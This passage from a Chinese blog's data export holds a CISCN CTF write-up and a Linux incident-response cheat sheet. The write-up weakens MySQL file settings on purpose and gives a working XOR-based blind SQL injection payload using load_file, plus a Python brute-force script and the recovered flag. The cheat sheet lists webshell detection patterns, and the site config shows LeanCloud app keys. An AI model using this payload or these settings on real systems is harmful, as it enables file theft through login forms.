\n+--------------------+  \n1 row in set (0.00 sec)  \n  \nmysql> select username like 'b%' from user;  \n+--------------------+  \n| username like 'b%' |  \n+--------------------+  \n|                  0 |  \n+--------------------+  \n1 row in set (0.00 sec)  \n```\n结合上面我们的payload为  \n```\nadmin'^1^(select/**/load_file('/flag')/**/like/**/'c%')  \n```\npython脚本如下  \n```python\nimport requests\nimport string\nurl = 'http://192.168.1.205/ciscn12/web4/index.php'\ndef query(data):\n\tglobal url\n\tpayload = \"admin'^1^(select/**/load_file('/flag')/**/like/**/'{data}%')#\".format(data = data)\n\tproxies = {\"http\": \"http://127.0.0.1:8080\",\"https\": \"http://127.0.0.1:8080\",}\n\tdata = {'username':payload,'password':'1'}\n\treq = requests.post(url = url,data = data)\n\tlength = len(req.text)\n\treturn length\nif __name__ == '__main__':\n\tflag = ''\n\tstr = string.letters+string.digits+'{'+'}'\n\tfor j in range(50):\n\t\tfor i in str:\n\t\t\tflag += i\n\t\t\tres = query(flag)\n\t\t\tif(res == 462):\n\t\t\t\tbreak\n\t\t\telse:\n\t\t\t\tflag = flag[:-1]\n\t\tprint flag\n\t\tif i == '}':\n\t\t\tbreak\n```\nresult  \n```\nc  \nci  \ncis  \ncisc  \nciscn  \nciscn{  \nciscn{T  \nciscn{T2  \nciscn{T2U  \nciscn{T2UX  \nciscn{T2UXi  \nciscn{T2UXiF  \nciscn{T2UXiFe  \nciscn{T2UXiFeu  \nciscn{T2UXiFeu7  \nciscn{T2UXiFeu7H  \nciscn{T2UXiFeu7Hz  \nciscn{T2UXiFeu7Hzo  \nciscn{T2UXiFeu7HzoB  \nciscn{T2UXiFeu7HzoBj  \nciscn{T2UXiFeu7HzoBj4  \nciscn{T2UXiFeu7HzoBj4R  \nciscn{T2UXiFeu7HzoBj4R}  \n```\n待更新","slug":"guosaiwp1","published":1,"mouth":"06","updated":"2020-09-17T11:16:26.628Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxo000tez8k1zbxn5g7","content":"<p>这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）<br><a id=\"more\"></a><br>题目环境搭建<code>apache2+php7.2+mysql</code><br><pre><code class=\"hljs undefined\">ubuntu  \napt-get <span class=\"hljs-keyword\">install</span> apache2 php7<span class=\"hljs-number\">.2</span> mysql-<span class=\"hljs-keyword\">server</span> php7<span class=\"hljs-number\">.2</span>-mysql libapache2-<span class=\"hljs-keyword\">mod</span>-php  \n  \nmysql  \n/etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = <span class=\"hljs-string\">\"/\"</span>  \n<span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">FILE</span> <span class=\"hljs-keyword\">ON</span> *.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">'www-data'</span>@<span class=\"hljs-string\">'%'</span>;  \n<span class=\"hljs-keyword\">GRANT</span> ALL <span class=\"hljs-keyword\">PRIVILEGES</span> <span class=\"hljs-keyword\">ON</span> <span class=\"hljs-string\">`test`</span>.<span class=\"hljs-string\">`user`</span> <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">'www-data'</span>@<span class=\"hljs-string\">'%'</span>;</code></pre></p>\n<p>注入点判断payload，过滤了很多参数<br><pre><code class=\"hljs undefined\">admin'<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">or</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'1'</span>#</code></pre></p>\n<p>成功登陆后提示flag在根目录<br><img src=\"/img/2019-06-25/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>mysql读取文件有个方法是用load_file这个命令,具体用法如下<br><pre><code class=\"hljs undefined\">mysql&gt; <span class=\"hljs-built_in\">select</span> load_file(<span class=\"hljs-string\">'/flag'</span>);  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n| load_file(<span class=\"hljs-string\">'/flag'</span>)       |  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n| ciscn&#123;T2UXiFeu7HzoBj4R&#125;  |  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> set (<span class=\"hljs-number\">0.01</span> sec)</code></pre></p>\n<p>因为and被过滤了，<code>^</code>（异或）没有，所以判断语句如下<br><pre><code class=\"hljs undefined\">admin'^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">1</span>#</code></pre></p>\n<p><code>^</code>符号的用法如下<br><pre><code class=\"hljs undefined\">mysql&gt; select * <span class=\"hljs-built_in\">from</span> user where username = <span class=\"hljs-string\">'admin'</span>^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">1</span>;  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n| username | password |  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n| admin    | admin123 |  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span>, <span class=\"hljs-number\">2</span> warnings (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)  \n  \nmysql&gt; select * <span class=\"hljs-built_in\">from</span> user where username = <span class=\"hljs-string\">'admin'</span>^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">0</span>;  \nEmpty <span class=\"hljs-built_in\">set</span>, <span class=\"hljs-number\">2</span> warnings (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)</code></pre></p>\n<p>因此我们需要构造判断结果为1的查询语句，这里要用到<code>like</code>这个方法<br><pre><code class=\"hljs undefined\">mysql&gt; select username like <span class=\"hljs-string\">'a%'</span> <span class=\"hljs-built_in\">from</span> user;  \n+<span class=\"hljs-comment\">--------------------+  </span>\n| username like <span class=\"hljs-string\">'a%'</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n|                  <span class=\"hljs-number\">1</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)  \n  \nmysql&gt; select username like <span class=\"hljs-string\">'b%'</span> <span class=\"hljs-built_in\">from</span> user;  \n+<span class=\"hljs-comment\">--------------------+  </span>\n| username like <span class=\"hljs-string\">'b%'</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n|                  <span class=\"hljs-number\">0</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)</code></pre></p>\n<p>结合上面我们的payload为<br><pre><code class=\"hljs undefined\">admin'^1^(<span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">load_file</span>(<span class=\"hljs-string\">'/flag'</span>)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">like</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-string\">'c%'</span>)</code></pre></p>\n<p>python脚本如下<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\n<span class=\"hljs-keyword\">import</span> string\nurl = <span class=\"hljs-string\">'http://192.168.1.205/ciscn12/web4/index.php'</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">query</span><span class=\"hljs-params\">(data)</span>:</span>\n\t<span class=\"hljs-keyword\">global</span> url\n\tpayload = <span class=\"hljs-string\">\"admin'^1^(select/**/load_file('/flag')/**/like/**/'&#123;data&#125;%')#\"</span>.format(data = data)\n\tproxies = &#123;<span class=\"hljs-string\">\"http\"</span>: <span class=\"hljs-string\">\"http://127.0.0.1:8080\"</span>,<span class=\"hljs-string\">\"https\"</span>: <span class=\"hljs-string\">\"http://127.0.0.1:8080\"</span>,&#125;\n\tdata = &#123;<span class=\"hljs-string\">'username'</span>:payload,<span class=\"hljs-string\">'password'</span>:<span class=\"hljs-string\">'1'</span>&#125;\n\treq = requests.post(url = url,data = data)\n\tlength = len(req.text)\n\t<span class=\"hljs-keyword\">return</span> length\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n\tflag = <span class=\"hljs-string\">''</span>\n\tstr = string.letters+string.digits+<span class=\"hljs-string\">'&#123;'</span>+<span class=\"hljs-string\">'&#125;'</span>\n\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">50</span>):\n\t\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> str:\n\t\t\tflag += i\n\t\t\tres = query(flag)\n\t\t\t<span class=\"hljs-keyword\">if</span>(res == <span class=\"hljs-number\">462</span>):\n\t\t\t\t<span class=\"hljs-keyword\">break</span>\n\t\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t\tflag = flag[:<span class=\"hljs-number\">-1</span>]\n\t\t<span class=\"hljs-keyword\">print</span> flag\n\t\t<span class=\"hljs-keyword\">if</span> i == <span class=\"hljs-string\">'&#125;'</span>:\n\t\t\t<span class=\"hljs-keyword\">break</span></code></pre></p>\n<p>result<br><pre><code class=\"hljs undefined\"><span class=\"xml\">c  \nci  \ncis  \ncisc  \nciscn  \nciscn</span><span class=\"hljs-template-variable\">&#123;  \nciscn&#123;T  \nciscn&#123;T2  \nciscn&#123;T2U  \nciscn&#123;T2UX  \nciscn&#123;T2UXi  \nciscn&#123;T2UXiF  \nciscn&#123;T2UXiFe  \nciscn&#123;T2UXiFeu  \nciscn&#123;T2UXiFeu7  \nciscn&#123;T2UXiFeu7H  \nciscn&#123;T2UXiFeu7Hz  \nciscn&#123;T2UXiFeu7Hzo  \nciscn&#123;T2UXiFeu7HzoB  \nciscn&#123;T2UXiFeu7HzoBj  \nciscn&#123;T2UXiFeu7HzoBj4  \nciscn&#123;T2UXiFeu7HzoBj4R  \nciscn&#123;T2UXiFeu7HzoBj4R&#125;</span><span class=\"xml\"></span></code></pre></p>\n<p>待更新</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）<br>","more":"<br>题目环境搭建<code>apache2+php7.2+mysql</code><br><pre><code class=\"hljs undefined\">ubuntu  \napt-get <span class=\"hljs-keyword\">install</span> apache2 php7<span class=\"hljs-number\">.2</span> mysql-<span class=\"hljs-keyword\">server</span> php7<span class=\"hljs-number\">.2</span>-mysql libapache2-<span class=\"hljs-keyword\">mod</span>-php  \n  \nmysql  \n/etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = <span class=\"hljs-string\">\"/\"</span>  \n<span class=\"hljs-keyword\">GRANT</span> <span class=\"hljs-keyword\">FILE</span> <span class=\"hljs-keyword\">ON</span> *.* <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">'www-data'</span>@<span class=\"hljs-string\">'%'</span>;  \n<span class=\"hljs-keyword\">GRANT</span> ALL <span class=\"hljs-keyword\">PRIVILEGES</span> <span class=\"hljs-keyword\">ON</span> <span class=\"hljs-string\">`test`</span>.<span class=\"hljs-string\">`user`</span> <span class=\"hljs-keyword\">TO</span> <span class=\"hljs-string\">'www-data'</span>@<span class=\"hljs-string\">'%'</span>;</code></pre></p>\n<p>注入点判断payload，过滤了很多参数<br><pre><code class=\"hljs undefined\">admin'<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">or</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'1'</span>#</code></pre></p>\n<p>成功登陆后提示flag在根目录<br><img src=\"/img/2019-06-25/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>mysql读取文件有个方法是用load_file这个命令,具体用法如下<br><pre><code class=\"hljs undefined\">mysql&gt; <span class=\"hljs-built_in\">select</span> load_file(<span class=\"hljs-string\">'/flag'</span>);  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n| load_file(<span class=\"hljs-string\">'/flag'</span>)       |  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n| ciscn&#123;T2UXiFeu7HzoBj4R&#125;  |  \n+<span class=\"hljs-comment\">--------------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> set (<span class=\"hljs-number\">0.01</span> sec)</code></pre></p>\n<p>因为and被过滤了，<code>^</code>（异或）没有，所以判断语句如下<br><pre><code class=\"hljs undefined\">admin'^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">1</span>#</code></pre></p>\n<p><code>^</code>符号的用法如下<br><pre><code class=\"hljs undefined\">mysql&gt; select * <span class=\"hljs-built_in\">from</span> user where username = <span class=\"hljs-string\">'admin'</span>^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">1</span>;  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n| username | password |  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n| admin    | admin123 |  \n+<span class=\"hljs-comment\">----------+----------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span>, <span class=\"hljs-number\">2</span> warnings (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)  \n  \nmysql&gt; select * <span class=\"hljs-built_in\">from</span> user where username = <span class=\"hljs-string\">'admin'</span>^<span class=\"hljs-number\">1</span>^<span class=\"hljs-number\">0</span>;  \nEmpty <span class=\"hljs-built_in\">set</span>, <span class=\"hljs-number\">2</span> warnings (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)</code></pre></p>\n<p>因此我们需要构造判断结果为1的查询语句，这里要用到<code>like</code>这个方法<br><pre><code class=\"hljs undefined\">mysql&gt; select username like <span class=\"hljs-string\">'a%'</span> <span class=\"hljs-built_in\">from</span> user;  \n+<span class=\"hljs-comment\">--------------------+  </span>\n| username like <span class=\"hljs-string\">'a%'</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n|                  <span class=\"hljs-number\">1</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)  \n  \nmysql&gt; select username like <span class=\"hljs-string\">'b%'</span> <span class=\"hljs-built_in\">from</span> user;  \n+<span class=\"hljs-comment\">--------------------+  </span>\n| username like <span class=\"hljs-string\">'b%'</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n|                  <span class=\"hljs-number\">0</span> |  \n+<span class=\"hljs-comment\">--------------------+  </span>\n<span class=\"hljs-number\">1</span> row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0.00</span> <span class=\"hljs-built_in\">sec</span>)</code></pre></p>\n<p>结合上面我们的payload为<br><pre><code class=\"hljs undefined\">admin'^1^(<span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">load_file</span>(<span class=\"hljs-string\">'/flag'</span>)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">like</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-string\">'c%'</span>)</code></pre></p>\n<p>python脚本如下<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\n<span class=\"hljs-keyword\">import</span> string\nurl = <span class=\"hljs-string\">'http://192.168.1.205/ciscn12/web4/index.php'</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">query</span><span class=\"hljs-params\">(data)</span>:</span>\n\t<span class=\"hljs-keyword\">global</span> url\n\tpayload = <span class=\"hljs-string\">\"admin'^1^(select/**/load_file('/flag')/**/like/**/'&#123;data&#125;%')#\"</span>.format(data = data)\n\tproxies = &#123;<span class=\"hljs-string\">\"http\"</span>: <span class=\"hljs-string\">\"http://127.0.0.1:8080\"</span>,<span class=\"hljs-string\">\"https\"</span>: <span class=\"hljs-string\">\"http://127.0.0.1:8080\"</span>,&#125;\n\tdata = &#123;<span class=\"hljs-string\">'username'</span>:payload,<span class=\"hljs-string\">'password'</span>:<span class=\"hljs-string\">'1'</span>&#125;\n\treq = requests.post(url = url,data = data)\n\tlength = len(req.text)\n\t<span class=\"hljs-keyword\">return</span> length\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n\tflag = <span class=\"hljs-string\">''</span>\n\tstr = string.letters+string.digits+<span class=\"hljs-string\">'&#123;'</span>+<span class=\"hljs-string\">'&#125;'</span>\n\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">50</span>):\n\t\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> str:\n\t\t\tflag += i\n\t\t\tres = query(flag)\n\t\t\t<span class=\"hljs-keyword\">if</span>(res == <span class=\"hljs-number\">462</span>):\n\t\t\t\t<span class=\"hljs-keyword\">break</span>\n\t\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t\tflag = flag[:<span class=\"hljs-number\">-1</span>]\n\t\t<span class=\"hljs-keyword\">print</span> flag\n\t\t<span class=\"hljs-keyword\">if</span> i == <span class=\"hljs-string\">'&#125;'</span>:\n\t\t\t<span class=\"hljs-keyword\">break</span></code></pre></p>\n<p>result<br><pre><code class=\"hljs undefined\"><span class=\"xml\">c  \nci  \ncis  \ncisc  \nciscn  \nciscn</span><span class=\"hljs-template-variable\">&#123;  \nciscn&#123;T  \nciscn&#123;T2  \nciscn&#123;T2U  \nciscn&#123;T2UX  \nciscn&#123;T2UXi  \nciscn&#123;T2UXiF  \nciscn&#123;T2UXiFe  \nciscn&#123;T2UXiFeu  \nciscn&#123;T2UXiFeu7  \nciscn&#123;T2UXiFeu7H  \nciscn&#123;T2UXiFeu7Hz  \nciscn&#123;T2UXiFeu7Hzo  \nciscn&#123;T2UXiFeu7HzoB  \nciscn&#123;T2UXiFeu7HzoBj  \nciscn&#123;T2UXiFeu7HzoBj4  \nciscn&#123;T2UXiFeu7HzoBj4R  \nciscn&#123;T2UXiFeu7HzoBj4R&#125;</span><span class=\"xml\"></span></code></pre></p>\n<p>待更新</p>"},{"title":"应急响应之linux篇","index_img":"/img/2019-07-22/index.jpg","date":"2019-07-22T11:32:50.000Z","_content":"\n#### 记录一些常用linux应急响应知识\n<!--more-->\n###### 表现为卡慢-性能资源紧张\n```bash\nfree -m               #以MB为单位查看内存使用情况  \nfree -l               #查看内存使用细节  \nps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head #查看内存使用前十名  \nvmstat -a             #查看CPU使用详情  \nvmstat -d             #查看CPU使用详情  \n```\n###### 宕机死机\n```bash\ndmesg -T              #按时间点查看内核日志  \ndmesg -T |grep memory #查看和内存相关的日志记录  \ndmesg -T |grep cache  #查看和崩溃相关的日志记录  \ndmesg -T |grep reboot #查看和重启相关的日志记录  \ncat /var/log/syslog   #查看系统日志  \ncat /var/log/kern.log #查看内核日志(ubuntu是kern.log，其他是kernel.log)  \n```\n###### 断网断连排查-表现为网络不通或者间歇性连通\n```bash\niptables -L          #查看防火墙  \ncat /etc/resolv.conf #查看域名解析  \nifoncifg -a          #查看网卡信息  \n```\n###### 一些服务的日志位置\n```bash\n/var/log/httpd/access.log     #http服务日志  \n/var/log/vsftp.log            #ftp服务日志  \n/var/log/samba                #samba服务日志  \n/var/log/message              #DNS、DHCP日志  \n```\n###### 入侵点入侵特征排查\n```bash\nnetstat -antlop      #查看  \nps -ef               #查看异常连接和对应的文件  \nps aux               #查看那进程详细信息  \nlsof -p pid          #查看进程关联账户信息  \n  \n附录：ps命令常用用法（方便查看系统进程）  \nps a  \t#显示现行终端机下的所有程序，包括其他用户的程序。  \nps -A \t#显示所有进程。  \nps c \t#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  \nps -e \t#此参数的效果和指定\"A\"参数相同。  \nps e \t#列出程序时，显示每个程序所使用的环境变量。  \nps f \t#用ASCII字符显示树状结构，表达程序间的相互关系。  \nps -H \t#显示树状结构，表示程序间的相互关系。  \nps -N \t#显示所有的程序，除了执行ps指令终端机下的程序之外。  \nps s \t#采用程序信号的格式显示程序状况。  \nps S \t#列出程序时，包括已中断的子程序资料。  \nps -t<终端机编号> 　#指定终端机编号，并列出属于该终端机的程序的状况。  \nps u 　 #显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  \nps x 　\t#显示所有程序，不以终端机来区分。  \n```\n**最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作**\n###### 登陆和爆破排查\n```bash\nlast                        #查看登陆或者重启日志  \nlastb                       #查看登录失败日志，或者是cat /var/log/faillog  \nwho /var/log/wtmp           #查看登录日志，或者last -f /var/run/utmp  \ncat /var/log/lastlog        #查看最后的登录日志  \ncat /var/log/secure         #查看安全日志  \ncat /var/log/cron           #查看计划任务日志  \ncat ~/.bash_history | more  #查看历史操作  \ngrep \"Failed password for root\" /var/log/auth.log | awk '{print $11}' | sort | uniq -nr | more  #查看root账户登录爆破尝试  \ngrep \"Accepted\" /var/log/auth.log | awk '{print $11}' | sort |uniq -c | sort -nr | more #查看登录成功日志信息  \nstrings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'   #查看sshd的信息  \n```\n###### 漏洞利用入侵和后渗透的特征\n```bash\n#查找webshell:  \nfind /var/www/ -name \"*.php\" | xargs egrep 'assert | phpspy | c99sh | milw0rm | eval | \\( gunerpress | \\(bas464_encode | spider _bc | shell_exec | passthru | \\(\\$\\_\\POST\\[|eval\\(str_rotl3 | .chr\\c|\\$\\{\\\"\\_P|eval\\C\\$\\_R | file_put_contents\\C\\.\\*\\$\\_ | base64_decode'  \n#文件查找的相关命令：  \nsudo find / -mtime(atime/ctime) -x   #按照创建、修改时间查找  \nsudo find ./ -perm 4777              #按照权限查找文件  \nfind  ./ -mtime -1 -type f           #按照文件类型查找  \nfind -mtime -1 -type f -name \\*.php  #查找最近一天被修改过的php文件  \n```","source":"_posts/2019-07-22-Emergency_Response.md","raw":"---\ntitle: 应急响应之linux篇\nindex_img: /img/2019-07-22/index.jpg\ndate: 2019-07-22 19:32:50\ntags:\n- linux\n- 应急响应\n---\n\n#### 记录一些常用linux应急响应知识\n<!--more-->\n###### 表现为卡慢-性能资源紧张\n```bash\nfree -m               #以MB为单位查看内存使用情况  \nfree -l               